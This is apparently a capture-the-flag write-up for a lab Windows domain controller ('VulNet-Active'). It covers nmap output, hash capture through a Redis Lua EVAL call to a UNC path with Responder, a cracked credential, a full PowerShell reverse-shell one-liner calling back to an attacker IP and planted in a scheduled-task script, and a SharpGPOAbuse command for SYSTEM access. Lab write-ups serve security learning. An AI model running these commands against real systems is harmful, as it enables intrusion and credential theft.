## VulNet-Active

### Nmap

```bash
# Nmap 7.91 scan initiated Sun Aug  1 15:06:30 2021 as: nmap -sT -sC -sV -vvv -p- -T4 -Pn -oA nmapscan 10.10.188.12
Nmap scan report for 10.10.188.12
Host is up, received user-set (0.055s latency).
Scanned at 2021-08-01 15:06:30 CEST for 187s
Not shown: 65523 filtered ports
Reason: 65523 no-responses
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
6379/tcp  open  redis         syn-ack Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Redis

the redis-cli shows the user

10.10.188.12:6379> CONFIG GET *
	
	103) "dir"
	104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"

Exploit this redis older versions we can execute the LUA scripts by using the EVAL cmd. dofile() is a command that can be used to enumerate files and directories.

https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass

fire up the responder
	
	responder -I tun0 -i 10.10.30.238

10.10.188.12:6379> EVAL "dofile("//10.x.x.11/hello")" 0 then run this on redis-cli got the enterprise-security user's hash.

crackthehash myself im using john 

	enterprise-security:sand_0873959498

this are smb creds and in smb we got the ps1 file and this is schedule task ig let me change the script with my reverse shell.

the reverse shell 

```ps
$client = New-Object System.Net.Sockets.TCPClient("10.9.3.94a",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 

``` 

upload this on smb and wait for the shell!!!!!!!

## Privesc

Bloodhound The user ENTERPRISE-SECURITY-VULNNET.LOCAL has generic write access to the GPO SECURITY-POL-VN-VULNNET.LOCAL. 

**Generic Write Access**

GenericWrite - update object's attributes (i.e logon script) WriteOwner - change object owner to attacker controlled user take over the object. WriteDACL - modify object's ACEs and give attacker full control right over the object. AllExtendedRights - ability to add user to a group or reset password. 

## Exploit Group Policy Objects GPO


.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"

gpupdate /force

now check the smbclient c$ share

you got THE system!!!!!


## References

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#exploit-group-policy-objects-gpo

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#sharpgpoabuse-abuse-gpo

https://www.adamcouch.co.uk/gpo-abuse-edit-permissions-misconfiguration/

